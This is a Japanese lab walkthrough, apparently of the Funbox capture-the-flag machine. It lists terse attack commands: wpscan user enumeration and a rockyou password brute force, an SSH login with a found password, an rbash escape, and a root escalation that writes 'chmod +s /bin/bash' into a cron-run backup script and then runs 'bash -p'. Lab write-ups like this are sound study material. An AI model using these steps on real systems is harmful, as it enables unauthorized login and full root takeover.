### 論点
- pspy,backup.sh
### keyword
- ドメインの設定,wordpress,wpscan,cron

## 攻略
- nmap
  - 21,22,80,33060
  - /etc/hostsを書き換える。書き換えなくても見れる
- サイトを見る
  - ソースは何もない
- gobusterする
  - /secret/
- ユーザを探す
  - `wpscan --url http://funbox.fritz.box/ -e u --ignore-main-redirect`
  - `--ignore-main-redirect`リダイレクトするのでつける
- `wpscan --url http://funbox.fritz.box/ -U joe -P /usr/share/wordlists/rockyou.txt --ignore-main-redirect`
- `ssh joe@$IP` 12345
- システム内の探索
- `uname -a`
  - 64bitであることがわかる 
- sudo -l
- SUIDをしようとするとrbashなのでダメとなる
  - `bash -i` これで通常のbashになるのがわからん
  - pkexecが多分使える
- `ps aux | grep root`
  - cronが動いているのがわかる
  - pspy64を取得して実行する
- (補足) `.backup.sh`を探す
  - joeにmboxというのがあって中を読むとbackupしているとある
  - `find / -iname "*backup*" 2>/dev/null`

- `vim /home/funny/.backup.sh`
  - `chmod +s /bin/bash`
- 時間が経ってls -la /bin/bashでpermmisionがsになるのを待つ
- rootになる
  - `bash -p`   



